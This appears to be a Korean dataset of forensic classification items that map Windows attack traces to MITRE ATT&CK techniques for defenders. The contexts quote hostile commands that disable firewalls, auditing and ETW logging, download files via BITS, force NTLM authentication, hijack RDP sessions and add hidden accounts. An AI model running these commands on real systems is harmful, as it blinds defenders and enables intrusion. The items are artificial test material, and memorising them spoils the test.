{"id": "T1137.002_Q2", "question": "레지스트리에서 Office Test\\Special\\Perf 키에 DLL 경로가 설정되어 있을 때, 포렌식 관점에서 어떤 위험을 의심해야 할까?", "context": "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf 값이 'C:\\Users\\<USER>\\T1137.002\\bin\\officetest_x64.dll' 로 설정되어 있고, Word 실행 시 해당 DLL이 로드된 흔적이 모듈 로드 로그에 남아 있다.", "answer": "Office Test 키는 원래 디버깅용이지만, 공격자는 여기에 임의 DLL 경로를 넣어 Office 시작 시 악성 DLL을 자동 로드하는 지속성 수단으로 악용할 수 있다. 이는 T1137.002 Office Application Startup: Office Test 기법에 해당하며, 정당한 디버깅 사용이 아니라면 강하게 악성 가능성을 의심해야 한다.", "question_type": "attack_classification"}
{"id": "T1137.004_Q2", "question": "Outlook 관련 레지스트리에서 특정 폴더의 WebView URL이 이상한 HTML 파일을 가리키고 있다. 이 경우 어떤 행위를 의심해야 할까?", "context": "HKCU\\Software\\Microsoft\\Office\\16.0\\Outlook\\WebView\\Inbox\\URL 값이 file://C:/Users/<USER>/AppData/Roaming/T1137.004.html 로 설정되어 있고, 해당 HTML 안에 obfuscated JavaScript가 포함되어 있다.", "answer": "Outlook 폴더의 Home Page 설정을 악성 HTML/스크립트로 바꿔두면, Inbox를 열 때마다 코드가 실행된다. 이는 T1137.004 Outlook Home Page 기반 지속성·코드 실행 기법으로, 피싱/다운로더/C2 초기 로딩 지점으로 악용될 수 있다.", "question_type": "attack_classification"}
{"id": "T1137.006_Q2", "question": "Excel Add-in(XLL) 파일 등록 후 Excel을 실행할 때마다 notepad.exe가 생성되는 현상이 관찰되었다. 어떤 공격 기법인가?", "context": "C:\\Users\\<USER>\\AppData\\Roaming\\Microsoft\\AddIns\\notepad.xll 파일이 존재하고, Excel 실행 시 매번 notepad.exe가 자식 프로세스로 뜬다. 사전에는 PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x64.xll 파일이 복사된 이력이 있다.", "answer": "이는 Excel Add-in(XLL)을 이용한 지속성/코드 실행 기법으로, T1137.006 Office Application Startup: Add-ins에 해당한다. 공격자는 정상 Add-in처럼 보이는 XLL에 악성 코드를 넣고, Excel 시작 시 자동으로 실행되게 한다.", "question_type": "attack_classification"}
{"id": "T1137.006_Q3", "question": "Word\\Startup 경로에 WLL 파일이 놓여 있고 Word 실행 시마다 notepad.exe가 실행된다. 이 패턴은 어떤 기술로 설명할 수 있을까?", "context": "C:\\Users\\<USER>\\AppData\\Roaming\\Microsoft\\Word\\Startup\\notepad.wll 파일이 존재하며, 해당 파일은 wordwll_x86.wll 에서 복사된 것으로 보인다. WinWord.exe 시작 직후 notepad.exe 프로세스가 반복적으로 생성된다.", "answer": "Word Add-in(WLL)을 통해 Word 시작 시 자동으로 로드되는 DLL 형태의 코드를 심어둔 것으로, T1137.006 Office Application Startup: Add-ins에 속한다. Word Add-in 폴더는 사용자가 잘 확인하지 않기 때문에 은신성 높은 지속성 지점이다.", "question_type": "attack_classification"}
{"id": "T1137.006_Q4", "question": "Excel의 XLSTART 폴더에 XLAM 파일이 존재하고, Excel 실행 시 매번 특정 매크로 코드가 동작한다. 어떤 공격 시나리오에 해당할까?", "context": "C:\\Users\\<USER>\\AppData\\Roaming\\Microsoft\\Excel\\XLSTART\\notepad.xlam 파일이 있고, ExcelVBAaddin.xlam 에서 복사된 흔적이 있다. Excel 켤 때마다 매크로가 자동 실행되어 notepad.exe를 띄우는 로그가 남는다.", "answer": "XLSTART 폴더의 XLAM Add-in은 사용자 개입 없이 Excel 실행 시 바로 로드된다. 이를 악용한 것은 T1137.006 Add-ins 기반 지속성으로, VBA 매크로를 영구 등록해 C2, 다운로드, lateral movement 스크립트를 자동 기동하는 데 쓸 수 있다.", "question_type": "attack_classification"}
{"id": "T1137.006_Q5", "question": "PowerPoint Add-in(PPAM)을 이용해 PowerPoint 시작 시마다 notepad.exe가 뜨는 이상 행위가 있다. 어떤 MITRE 기법에 맞을까?", "context": "$env:APPDATA\\Microsoft\\AddIns\\notepad.ppam 파일이 존재하고, 레지스트리 HKCU\\Software\\Microsoft\\Office\\16.0\\PowerPoint\\AddIns\\notepad 키에 Autoload=1, Path='notepad.ppam' 값이 설정되어 있다.", "answer": "이는 PowerPoint VBA Add-in(PPAM)을 활용한 지속성으로, T1137.006 Office Application Startup: Add-ins 기법이다. Autoload로 설정된 PPAM은 사용자가 프레젠테이션을 열 때마다 자동 실행되며, 랜섬웨어/다운로더 전단계로 적합한 훅 지점이다.", "question_type": "attack_classification"}
{"id": "T1140_Q2", "question": "공격자가 certutil.exe를 다른 이름으로 복사한 후 인코딩/디코딩에 사용하는 흔적이 있다. 어떤 기법에 해당할까?", "context": "%windir%\\system32\\certutil.exe 가 %temp%\\tcm.tmp 로 복사된 뒤, 'tcm.tmp -encode C:\\Windows\\System32\\calc.exe %temp%\\T1140_calc2.txt' 와 'tcm.tmp -decode %temp%\\T1140_calc2.txt %temp%\\T1140_calc2_decoded.exe' 명령이 보안 로그에 기록되었다.", "answer": "certutil을 다른 이름으로 복사해 인코딩/디코딩에 사용하는 것은 탐지 우회를 노린 변형일 뿐, 여전히 페이로드를 디코딩·복원하는 행위다. 이는 T1140 Deobfuscate/Decode Files or Information 기법의 변형으로 볼 수 있다.", "question_type": "attack_classification"}{"id": "T1140_Q3", "question": "makecab과 expand.exe를 사용해 텍스트 파일을 CAB로 압축 후 다시 풀어내는 행위를 포렌식에서 봤다면 어떤 점을 의심해야 할까?", "context": "PathToAtomicsFolder\\T1140\\src\\art-expand-source.txt 파일을 makecab 으로 art-expand-test.cab 으로 만든 후, expand.exe로 %TEMP%\\art-expand-out\\ 경로에 다시 풀어낸 작업 흔적이 있다. 해당 CAB 내부에 PE 파일이 포함된 사례도 있다.", "answer": "makecab/expand는 정상적인 관리 도구지만, 공격자가 이를 이용해 악성 페이로드를 CAB로 포장하고 다시 풀어낼 수 있다. 이런 디코딩·압축 해제 체인은 T1140 Deobfuscate/Decode Files or Information의 한 형태로, 파일 기반 페이로드 준비 과정일 가능성이 높다.", "question_type": "attack_classification"}
{"id": "T1176_Q2", "question": "Chrome 확장 프로그램 화면에서 개발자 모드가 켜져 있고, 사용자가 로컬 디렉터리에서 unpacked extension을 로드한 흔적이 있다. 어떤 유형의 공격과 연관 지을 수 있을까?", "context": "chrome://extensions 페이지에서 'Developer mode'가 활성화되어 있으며, C:\\Users\\<USER>\\Downloads\\Browser_Extension 폴더가 Load unpacked extension 대상으로 지정되었다. 해당 확장에는 브라우저 히스토리 접근 권한이 포함되어 있다.", "answer": "개발자 모드에서 unpacked extension을 로드하는 행위는 악성 브라우저 확장을 로컬 디렉터리에서 바로 올리는 전형적인 패턴이다. 이는 T1176 Browser Extensions 기법과 맞으며, 히스토리/쿠키/폼데이터 탈취나 트래픽 인젝션에 사용될 수 있다.", "question_type": "attack_classification"}
{"id": "T1176_Q3", "question": "사용자 프로필에서 'Minimum Viable Malicious Extension' 같은 의심스러운 이름의 Chrome 확장이 웹스토어를 통해 설치되었다. 이 경우 어떤 기법을 고려해야 할까?", "context": "Chrome 히스토리에서 'https://chrome.google.com/webstore/detail/minimum-viable-malicious/...' URL 접속 후, 새 확장 설치 이벤트가 발생했다. 이후 해당 확장은 모든 사이트 데이터 접근 권한을 가진 것으로 확인된다.", "answer": "Chrome Web Store라도 악성 확장이 올라올 수 있다. 악성 확장 설치는 T1176 Browser Extensions 기법이며, 브라우저 내 C2, keylogging, 세션 탈취에 활용될 수 있다.", "question_type": "attack_classification"}
{"id": "T1176_Q4", "question": "Edge Chromium에서 VPN 확장 프로그램이 수동으로 설치된 뒤, C2 통신이 그 VPN 터널을 통해 이뤄지는 것으로 추정된다. 이런 패턴은 어떤 ATT&CK 기술로 해석할 수 있을까?", "context": "사용자가 Edge Add-on 스토어에서 VPN 확장(fjnehcbecaggobjholekjijaaekbnlgj)을 'Get'으로 설치했다. 이후 의심스러운 도메인으로의 연결이 모두 VPN 확장 프로세스/트래픽을 통해 나가는 것이 확인되었다.", "answer": "브라우저 확장형 VPN을 이용해 트래픽을 우회하거나 TTP를 숨기는 것은 T1176 Browser Extensions 기술과 연관된다. 브라우저 수준에서 터널링·프록시를 제공해 네트워크 기반 탐지를 어렵게 만든다.", "question_type": "attack_classification"}
{"id": "T1176_Q5", "question": "Chrome을 --load-extension 옵션으로 실행해 특정 디렉터리의 확장을 강제로 로드하는 명령행이 발견됐다. 이건 어떤 행위와 관련될까?", "context": "PowerShell 로그에서 'Start-Process .\\chrome-win\\chrome.exe --load-extension=\"C:\\Users\\<USER>\\Temp\\extension\"' 명령이 실행되었다. extension 폴더 안에는 uBlock Origin Lite 기반 manifest와 수정된 background 스크립트가 존재한다.", "answer": "브라우저를 명령줄 인자 --load-extension으로 실행해 확장을 강제로 로드하는 것은 사용자가 UI에서 설치하지 않아도 악성 확장을 주입하는 방법이다. 이는 T1176 Browser Extensions 기법의 자동화/스텔스 변형이다.", "question_type": "attack_classification"}
{"id": "T1187_Q2", "question": "PetitPotam.exe가 도메인 컨트롤러를 대상으로 실행되고, 공격자 서버로 NTLM 인증이 유도된 로그가 있다. 이 상황에서 핵심적으로 어떤 위험을 봐야 할까?", "context": "PathToAtomicsFolder\\ExternalPayloads\\PetitPotam.exe 10.0.0.3 10.0.0.2 1 명령이 실행되었고, 10.0.0.3 서버로부터 NTLM 인증 요청이 캡처되었다.", "answer": "PetitPotam은 강제 인증(Forced Authentication)을 유발해 NTLM 해시를 공격자 서버로 보내게 만든다. 이후 NTLM 릴레이나 패스더해시 공격으로 이어질 수 있으며, 이는 T1187 Forced Authentication 기법의 대표 사례다.", "question_type": "attack_classification"}
{"id": "T1187_Q3", "question": "Invoke-Internalmonologue.ps1을 통해 'Retrieving NTLM Hashes without Touching LSASS'를 실행한 PowerShell 로그가 있다. 어떤 공격 기법인가?", "context": "PowerShell 로그에서 'Invoke-Internalmonologue -command \"-Downgrade true -impersonate true -restore true\"' 가 실행되었고, 그 결과 NTLM 해시가 메모리에서 추출되었다. LSASS 프로세스 메모리 덤프는 발생하지 않았다.", "answer": "Internal Monologue는 도메인 컨트롤러와의 인증 흐름을 악용해 NTLM 해시를 얻는 방법이다. LSASS를 직접 건드리지 않지만, 여전히 강제/간접 인증 채널을 이용해 크리덴셜을 추출하므로 T1187 Forced Authentication의 변형으로 볼 수 있다.", "question_type": "attack_classification"}
{"id": "T1187_Q4", "question": "rpcping 명령을 사용해 커스텀 포트로 인증된 RPC 호출을 만들고, 이 호출이 다른 서비스로 릴레이될 수 있는 구조라면 어떤 공격을 의심해야 할까?", "context": "보안 로그에서 'rpcping -s 192.168.0.10 -e 9997 /a connect /u NTLM' 명령이 여러 번 실행되었다. 해당 포트는 RPC 서비스가 Sign 플래그 없이 동작하도록 설정되어 있다.", "answer": "rpcping으로 인증된 RPC 호출을 만들어 NTLM 릴레이에 활용할 수 있다. 이 역시 강제 인증 채널을 구성해 자격 증명을 다른 서비스로 보내는 T1187 Forced Authentication의 한 형태다.", "question_type": "attack_classification"}
{"id": "T1195_Q2", "question": "탐지 로그에서 ExplorerSync.db가 %TEMP%\\..\\Microsoft 경로로 복사된 뒤, javaw -jar ExplorerSync.db 를 실행하는 예약 작업이 만들어졌다. 어떤 공급망 공격 패턴인가?", "context": "%temp%\\ExplorerSync.db 파일 생성 후 'copy %temp%\\ExplorerSync.db %temp%\\..\\Microsoft\\ExplorerSync.db' 가 실행되었고, schtasks /create /tn ExplorerSync /tr \"javaw -jar %temp%\\..\\Microsoft\\ExplorerSync.db\" /sc MINUTE /f 작업이 존재한다.", "answer": "ExplorerSync.db는 Octopus Scanner가 오픈소스 개발 환경 공급망을 통해 배포한 RAT 드로퍼 사례로 알려져 있다. 이처럼 정상 개발 체인에 악성 DB/JAR를 끼워 넣고 예약 작업으로 실행하는 것은 T1195 Supply Chain Compromise 시나리오에 해당한다.", "question_type": "attack_classification"}
{"id": "T1197_Q2", "question": "bitsadmin.exe /transfer /Download 명령으로 외부 Markdown 파일을 %TEMP% 경로로 내려받은 로그가 있다. 어떤 기술에 속할까?", "context": "명령 기록: 'bitsadmin.exe /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md %temp%\\bitsadmin1_flag.ps1'. 이후 이 파일을 추가 스크립트로 사용한 흔적도 있다.", "answer": "bitsadmin.exe를 이용한 다운로더 패턴으로, BITS를 통해 백그라운드 전송을 하는 T1197 BITS Jobs 기법이다. 간단한 Markdown이라도 이후 단계의 로더/명령 스크립트일 수 있다.", "question_type": "attack_classification"}
{"id": "T1197_Q3", "question": "Start-BitsTransfer로 실행 파일을 내려받은 후, BITS 작업 완료 시 notepad.exe 같은 프로그램을 실행하도록 설정한 경우 어떤 유형의 공격인가?", "context": "PowerShell에서 'Start-BitsTransfer -Priority foreground -Source https://.../T1197.md -Destination $env:TEMP\\bitsadmin2_flag.ps1' 실행 후, 별도의 BITS 작업에 /setnotifycmdline 옵션으로 'C:\\Windows\\system32\\notepad.exe'가 등록된 상태다.", "answer": "BITS 작업에 notifycmdline을 붙여 다운로드 완료 시 임의 프로그램을 실행하게 하는 것은 T1197 BITS Jobs 기법 중 지속성/실행에 초점을 둔 변형이다. 다운로드한 파일과 실행되는 프로세스가 다른 점도 특징적인 탐지 포인트다.", "question_type": "attack_classification"}
{"id": "T1197_Q4", "question": "desktopimgdownldr.exe를 사용해 LockScreenImage 경로로 악성 파일을 다운로드한 흔적이 있다. 이 경우 무엇을 의심해야 할까?", "context": "명령: 'SYSTEMROOT=C:\\Windows\\Temp && cmd /c desktopimgdownldr.exe /lockscreenurl:https://raw.githubusercontent.com/.../T1197.md /eventName:desktopimgdownldr'. 이후 C:\\Windows\\Temp\\Personalization\\LockScreenImage 폴더에 .md 파일이 생성되었다.", "answer": "desktopimgdownldr.exe는 원래 잠금 화면 배경 이미지를 내려받는 용도지만, 공격자는 임의 URL에 있는 악성 페이로드를 받는 데 쓸 수 있다. 이처럼 BITS 기반 시스템 도구를 악용하는 패턴은 T1197 BITS Jobs에 해당한다.", "question_type": "attack_classification"}
{"id": "T1562.002_Q2", "question": "IIS 서버에서 httplogging dontLog=true 설정이 적용된 레지스트리 변경이 발견됐다. 어떤 방어 회피를 의심해야 할까?", "context": "C:\\Windows\\System32\\inetsrv\\appcmd.exe set config \"Default Web Site\" /section:httplogging /dontLog:true 명령이 실행되었고, 이후 HTTP 요청에 대한 로그가 더 이상 생성되지 않는다.", "answer": "IIS HTTP 로그를 꺼버리면 웹셸 업로드, 익스플로잇 시도 등 웹 계층 공격이 서버 로그에 남지 않는다. 이는 T1562.002 Disable Windows Event Logging 범주에 들어가는 방어 무력화 행위다.", "question_type": "attack_classification"}
{"id": "T1562.002_Q3", "question": "Invoke-Phant0m.ps1을 통해 Windows Event Log Service 스레드를 죽이는 스크립트 실행이 확인되었다. 이건 어떤 종류의 공격인가?", "context": "%TEMP%\\Invoke-Phant0m.ps1 스크립트를 Import-Module 후 Invoke-Phant0m 함수를 실행했고, 그 뒤로 새 이벤트가 Security/System/Application 로그에 거의 기록되지 않는다.", "answer": "Phant0m은 EventLog 서비스의 스레드를 suspend/kill 해서 로깅 자체를 멈추게 만든다. 이는 T1562.002 Disable Windows Event Logging 기법의 대표적인 구현으로, 포렌식 이벤트 흐름을 완전히 끊어버린다.", "question_type": "attack_classification"}
{"id": "T1562.002_Q4", "question": "auditpol /set /category:\"Account Logon\" /success:disable /failure:disable 명령이 실행된 후 계정 로그온 이벤트가 더 이상 기록되지 않는다. 어떤 방어 무력화인가?", "context": "보안 로그에서 4672, 4624 등의 이벤트가 사라지고, 직전에 'auditpol /set /category:\"Account Logon\" /success:disable /failure:disable' 명령이 administrator 권한으로 실행된 것이 확인되었다.", "answer": "audit 정책을 꺼서 로그인/로그오프, 상세 추적 로그를 남기지 않게 만든 것은 T1562.002 Disable Windows Event Logging에 해당한다. 이후 계정 탈취나 lateral movement 흔적이 Security 로그에 안 남게 된다.", "question_type": "attack_classification"}
{"id": "T1562.002_Q5", "question": "wevtutil sl <logname> /e:false 명령으로 특정 이벤트 로그 채널을 비활성화한 경우, 어떤 포렌식 리스크가 발생하는가?", "context": "명령: 'wevtutil sl Microsoft-Windows-IKE/Operational /e:false'. 이후 해당 채널에 더 이상 새로운 이벤트가 생성되지 않는다.", "answer": "wevtutil sl /e:false 는 지정한 채널 자체를 비활성화한다. VPN/IPsec, Defender, PowerShell 등 주요 채널에 적용될 경우 탐지에 필요한 핵심 이벤트가 완전히 사라지므로, T1562.002 범주의 심각한 방어 무력화로 봐야 한다.", "question_type": "attack_classification"}
{"id": "T1562.002_Q6", "question": "레지스트리의 WINEVT\\Channels 또는 EventLog 서비스 하위에서 ChannelAccess/CustomSD SDDL 값이 'D;;0x1;;;WD' 등으로 바뀐 경우, 어떤 의도를 의심해야 할까?", "context": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-TaskScheduler/Operational 의 ChannelAccess 값이 'O:SYG:SYD:(D;;0x1;;;WD)' 로 설정되어 있고, 일반 사용자/관리자는 Event Viewer에서 해당 로그를 열 수 없다.", "answer": "ChannelAccess/CustomSD SDDL을 바꿔 특정 채널에 대한 읽기 권한을 제한하면, 탐지·포렌식 담당자가 로그를 보지 못한다. 이는 T1562.002 Disable Windows Event Logging의 변형으로, 로그 존재 자체를 숨기거나 분석을 방해하는 목적이다.", "question_type": "attack_classification"}
{"id": "T1562.003_Q2", "question": "PowerShell New-ItemProperty를 사용해 ProcessCreationIncludeCmdLine_Enabled 값을 0으로 변경한 후, 명령줄이 더 이상 이벤트에 포함되지 않는다. 이 행동은 어떤 공격 기법인가?", "context": "PowerShell에서 'New-ItemProperty -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\Audit\" -Name \"ProcessCreationIncludeCmdLine_Enabled\" -Value 0 -PropertyType DWORD -Force' 명령이 실행된 뒤, 4688/Sysmon 1 이벤트에 CommandLine 필드가 비어 있다.", "answer": "프로세스 생성 명령줄을 로그에서 제거하면, 실제 어떤 명령이 실행됐는지 추적하기 어려워진다. 이는 T1562.003 Impair Command History Logging에 해당하며, 공격자가 이후 악성 PowerShell/cmd를 마음껏 실행해도 감사 로그에 내용이 남지 않는다.", "question_type": "attack_classification"}
{"id": "T1562.004_Q2", "question": "netsh advfirewall set currentprofile state off 명령이 실행되었고, 직후 외부 C2 서버로의 연결이 폭증했다. 어떤 방어 무력화 기법인가?", "context": "이벤트 로그: 'netsh advfirewall set currentprofile state off' 실행, 이후 10.x.x.x:4444 로의 아웃바운드 연결이 방화벽 차단 없이 허용되었다.", "answer": "현재 프로파일 방화벽을 통째로 끄는 것은 T1562.004 Disable or Modify System Firewall 기법이다. 원격 조작, 랜섬웨어 C2, lateral movement 트래픽 등을 그대로 통과시키려는 의도다.", "question_type": "attack_classification"}
{"id": "T1562.004_Q3", "question": "레지스트리에서 SharedAccess\\Parameters\\FirewallPolicy\\PublicProfile\\EnableFirewall 값이 0으로 변경된 흔적이 있다. 어떤 상황을 고려해야 할까?", "context": "HKLM\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\PublicProfile\\EnableFirewall 레지스트리 값이 1에서 0으로 바뀐 뒤, 공용 네트워크 프로파일에서 모든 포트가 열려 있다.", "answer": "공용 프로파일 방화벽을 레지스트리에서 직접 꺼버린 것으로, GUI나 정책 로그를 우회할 수 있다. 이 역시 T1562.004 Disable or Modify System Firewall 범주에 속하는 방어 회피이다.", "question_type": "attack_classification"}
{"id": "T1562.004_Q4", "question": "netsh advfirewall firewall add rule name=\"Open Port to Any\" dir=in protocol=tcp localport=3389 action=allow profile=any 명령이 있었다. 이건 무슨 의도인가?", "context": "PowerShell에서 'netsh advfirewall firewall add rule name=\"Open Port to Any\" dir=in protocol=tcp localport=3389 action=allow profile=any' 를 실행한 후, 원격에서 RDP(3389) 연결이 가능해졌다.", "answer": "3389/RDP 포트를 모든 프로파일에서 열어 원격 접근을 쉽게 만들려는 것이다. 이는 T1562.004 Disable or Modify System Firewall 기법 중 포트 허용 규칙 추가 형태로, 백도어 RDP 접근에 자주 사용된다.", "question_type": "attack_classification"}
{"id": "T1562.004_Q5", "question": "사용자 프로필 아래에 떨어진 AtomicTest.exe를 방화벽에서 허용하는 규칙이 추가되었다. 어떻게 해석해야 할까?", "context": "C:\\Users\\<USER>\\AtomicTest.exe 파일이 존재하고, 'netsh advfirewall firewall add rule name=\"Atomic Test\" dir=in action=allow program=\"C:\\Users\\<USER>\\AtomicTest.exe\" enable=yes' 명령이 실행됐다.", "answer": "Users 디렉터리 아래의 비표준 위치에 있는 실행파일을 방화벽에서 예외 처리하는 것은 악성 프록시/백도어를 열어두기 위한 전형적 T1562.004 패턴이다. 서명/경로 기반 화이트리스트를 교란하는 효과가 있다.", "question_type": "attack_classification"}
{"id": "T1562.004_Q6", "question": "netsh firewall set opmode mode=disable 같은 구식 명령이 여전히 사용되어 방화벽이 꺼졌다면, 뭘 의심해야 할까?", "context": "로그에 'netsh firewall set opmode mode=disable' 명령이 남아 있고, 시스템 방화벽이 비활성화된 상태이다. 이는 LockBit/Blackbit 변종에서 관찰된 패턴과 유사하다.", "answer": "deprecated된 netsh firewall 구문도 아직 동작하기 때문에, 공격자가 스크립트 호환성을 위해 사용하는 경우가 많다. 이런 명령으로 방화벽을 끄는 행위 역시 T1562.004 Disable or Modify System Firewall에 해당한다.", "question_type": "attack_classification"}
{"id": "T1562.006_Q2", "question": "HKLM\\Software\\Microsoft\\.NETFramework\\ETWEnabled 값이 0으로 설정된 것을 발견했다. 어떤 방어 회피인가?", "context": "reg.exe 로 'REG ADD HKLM\\Software\\Microsoft\\.NETFramework /v ETWEnabled /t REG_DWORD /d 0' 명령이 수행되었고, 이후 .NET 기반 애플리케이션의 ETW 이벤트가 수집되지 않는다.", "answer": ".NET 애플리케이션의 ETW 로깅을 완전히 꺼버린 것으로, T1562.006 Indicator Blocking 기법이다. 많은 EDR이 .NET ETW를 후킹하므로, 이 값을 0으로 만드는 것은 탐지 기반을 직접 없애는 행위다.", "question_type": "attack_classification"}
{"id": "T1562.006_Q3", "question": "환경 변수 COMPlus_ETWEnabled=0 이 HKCU 및 HKLM 환경 레지스트리에 설정되어 있다. 이런 설정이 의미하는 것은?", "context": "HKCU\\Environment 및 HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment 하위에 COMPlus_ETWEnabled 문자열 값이 '0'으로 존재한다. 재로그온 후부터 .NET ETW 이벤트가 사라졌다.", "answer": "COMPlus_ETWEnabled=0은 .NET 런타임이 ETW 이벤트를 내보내지 않도록 만드는 환경 변수다. 이는 T1562.006 Indicator Blocking 기법의 또 다른 구현으로, 재부팅/재로그온 후 영속적으로 탐지 지표를 차단한다.", "question_type": "attack_classification"}
{"id": "T1562.006_Q4", "question": "레지스트리에서 Microsoft-Windows-Windows Defender/Operational 채널의 Enabled 값이 0으로 변경됐다. 포렌식 관점에서 무엇을 가장 먼저 의심해야 할까?", "context": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Windows Defender/Operational 의 Enabled REG_DWORD 값이 1에서 0으로 변경되었다. 이후 Defender Operational 로그에 새 이벤트가 없다.", "answer": "Defender ETW 채널을 끄는 것은 Defender 로그를 활용하는 모든 탐지 로직을 무력화하는 행위다. 이는 T1562.006 Indicator Blocking(지표 차단)으로, 랜섬웨어/멀웨어가 감지·차단되는 것을 회피하려는 명확한 의도다.", "question_type": "attack_classification"}
{"id": "T1562.006_Q5", "question": "logman update trace EventLog-Application --p Microsoft-Windows-PowerShell -ets 명령을 통해 PowerShell ETW provider가 제거되었다. 이건 어떤 공격 단계로 봐야 할까?", "context": "PsExec -s 로 실행된 cmd.exe 내에서 'logman update trace \"EventLog-Application\" --p \"Microsoft-Windows-Powershell\" -ets' 명령이 실행된 뒤, PowerShell 관련 ETW 이벤트가 줄어들었다.", "answer": "PowerShell ETW provider는 많은 EDR/로깅 솔루션이 명령 실행을 관찰하는 핵심 지점이다. 이를 logman으로 비활성화하는 것은 T1562.006 Indicator Blocking의 한 예로, 이후 PowerShell 기반 공격을 은폐하기 위한 준비 단계다.", "question_type": "attack_classification"}
{"id": "T1562.006_Q6", "question": "DNS Name Resolution Policy Table(NRPT)에 endpoint.security.microsoft.com 도메인에 대해 127.0.0.1 응답을 강제하는 규칙이 추가되었다. 어떤 의도인가?", "context": "Get-DnsClientNrptRule 결과, Namespace '.endpoint.security.microsoft.com' 과 'endpoint.security.microsoft.com' 에 대해 NameServers=127.0.0.1, Comment='Silenced by Name Resolution Policy Table' 인 룰이 존재한다.", "answer": "Defender for Endpoint 등 보안 서비스가 사용하는 도메인을 127.0.0.1로 바꿔서 통신을 차단하는 것이다. 이는 T1562.006 Indicator Blocking에 해당하며, 보안 제품의 클라우드 백엔드와의 통신·신호를 끊어 탐지/경보를 무력화한다.", "question_type": "attack_classification"}
{"id": "T1562.009_Q2", "question": "bcdedit /set safeboot network 명령이 실행된 후, 재부팅까지 짧은 시간 내에 여러 보안 서비스가 중지되었다. 공격자는 왜 이렇게 할까?", "context": "관리자 콘솔에서 bcdedit /set safeboot network 실행 후 시스템이 재부팅되었고, 안전 모드에서는 대부분의 AV/EDR 서비스가 실행되지 않는다. 이후 파일 암호화 행위가 진행되었다.", "answer": "안전 모드는 필수 드라이버와 서비스만 올라오기 때문에 많은 보안 제품이 작동하지 않는다. T1562.009 Safe Boot Mode 기법을 써서, 공격자는 방어 체계가 거의 없는 상태에서 암호화나 lateral movement를 진행할 수 있다.", "question_type": "attack_classification"}
{"id": "T1562.010_Q2", "question": "plink.exe를 통해 ESXi 서버에 접속한 뒤, esxcli software acceptance set --level=CommunitySupported 명령을 실행한 흔적이 있다. 이건 어떤 다운그레이드 공격인가?", "context": "명령: 'plink.exe -ssh atomic.local -l root -pw <pass> -m esx_community_supported.txt'. 스크립트 안에는 'esxcli software acceptance set --level=CommunitySupported' 가 포함되어 있다.", "answer": "ESXi VIB acceptance level을 CommunitySupported로 낮추면 서명·신뢰 기준이 완화되어 악성 VIB 설치가 쉬워진다. 이는 T1562.010 Downgrade Attack에 해당하는 하이퍼바이저 수준 다운그레이드다.", "question_type": "attack_classification"}
{"id": "T1563.002_Q2", "question": "서비스 sesshijack를 만들어 tscon으로 다른 사용자의 RDP 세션을 현재 세션에 붙이는 행위는 왜 위험한가?", "context": "sc.exe create sesshijack binpath= \"cmd.exe /k tscon 2 /dest:rdp-tcp#55\" 후 net start sesshijack 를 실행했다. 원래 사용자 세션 ID 2에 연결된 RDP 세션이 공격자 세션으로 옮겨졌다.", "answer": "tscon을 이용하면 비밀번호 없이도 기존 RDP 세션을 가로챌 수 있다. 서비스를 통해 이 과정을 자동화하는 것은 T1563.002 RDP Hijacking으로, 계정 탈취 없이도 이미 로그인된 세션의 권한을 훔치는 수법이다.", "question_type": "attack_classification"}
{"id": "T1564.001_Q2", "question": "attrib.exe +s 를 사용해 파일을 System 속성으로 바꾸고, /A:S 옵션으로만 삭제가 가능한 상태로 만든 경우 포렌식에서 어떤 의미인가?", "context": "%temp%\\T1564.001.txt 파일이 생성된 후 'attrib.exe +s %temp%\\T1564.001.txt' 명령이 실행되었다. 일반 탐색기에서는 숨김 파일 보기 옵션을 끄면 이 파일이 보이지 않는다.", "answer": "System 속성을 주면 일반 사용자가 파일 존재를 눈치채기 어렵다. 이는 T1564.001 Hidden Files and Directories 기법으로, 로더/구성 파일/마커 파일 등 악성 아티팩트를 눈에서 숨기기 위한 흔한 방법이다.", "question_type": "attack_classification"}
{"id": "T1564.002_Q2", "question": "AtomicOperator$ 같은 계정이 존재하지만, 로그인 화면에 나타나지 않는다. 레지스트리에서 어떤 키를 확인해야 하며, 관련 공격 기법은 무엇인가?", "context": "net user AtomicOperator$ At0micRedTeam! /add 명령으로 계정이 생성되었고, HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist 하위에 AtomicOperator$ REG_DWORD 0 값이 존재한다.", "answer": "SpecialAccounts\\UserList 에서 값이 0이면 해당 계정은 로그인 UI에 표시되지 않는다. 이는 로그인 화면에서 보이지 않는 숨김 백도어 계정을 만드는 T1564.002 Hidden Users 기법이다.", "question_type": "attack_classification"}
{"id": "T1564.003_Q2", "question": "Chrome 또는 Edge가 --headless 옵션으로 mockbin.org URL에 접속한 흔적이 있다. 이런 패턴은 어떤 공격과 연관될 수 있을까?", "context": "명령: 'chrome --headless --disable-gpu https://mockbin.org/bin/f6b9a876-a826-4ac0-83b8-639d6ad516ec'. 브라우저 창은 표시되지 않고, HTTP 요청만 발생했다.", "answer": "headless 브라우저는 사용자에게 창을 보여주지 않고도 자바스크립트·HTTP 요청을 수행할 수 있다. 이는 T1564.003 Hidden Window 기법의 한 형태로, 피싱 C2, 데이터 전송, 스크립트 로딩을 은밀히 수행하는 데 이용할 수 있다.", "question_type": "attack_classification"}
{"id": "T1564.003_Q3", "question": "conhost.exe --headless calc.exe 명령으로 conhost 가 숨김 형태로 실행되었다. 왜 이게 위험 신호일까?", "context": "PowerShell에서 'conhost.exe --headless calc.exe' 명령이 실행되었고, calc.exe가 백그라운드에서 동작한다. 사용자는 어떤 창도 보지 못한다.", "answer": "conhost는 콘솔 창 호스트지만 --headless 로 실행하면 UI 없는 프로세스 실행 프록시가 된다. 공격자가 이를 악용해 콘솔 기반 백도어를 사용자 몰래 돌릴 수 있으며, 이는 T1564.003 Hidden Window 악용 패턴이다.", "question_type": "attack_classification"}
